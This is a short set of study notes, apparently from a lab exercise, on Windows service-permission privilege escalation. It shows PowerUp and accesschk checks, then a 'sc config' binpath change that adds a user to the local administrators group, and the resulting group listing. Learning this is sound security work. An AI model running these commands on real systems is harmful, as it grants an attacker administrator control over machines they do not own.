# Service Permissions 

## Binary Path 

- It tells Windows which executable file (program or service binary) should run when the service starts
- Basically, it’s the path to the .exe (or .dll under svchost) that implements the service 
- If an attacker has permission to modify a service’s configuration (SERVICE_CHANGE_CONFIG), they can change the binPath to point to a malicious executable

**Victim** 

```
// to find the vulnerability using the powerup and now open powershell with execution policies bypass 
powershell -ep bypass 
. .\PowerUp.ps1 
Invoke-AllChecks 

// for manual checking 
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc

// or 
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc Everyone * 

// Notice that the output suggests that the everyone has the “SERVICE_CHANGE_CONFIG” permission which could lead to change the path of the executable 

// now make the exploitation 
sc config daclsvc binpath= "net localgroup administrators user /add"

// check the binpath
sc qc daclsvc
sc start daclsvc

// now we made the user as administrator 
net localgroup administrators 
Administrator 
user 
```
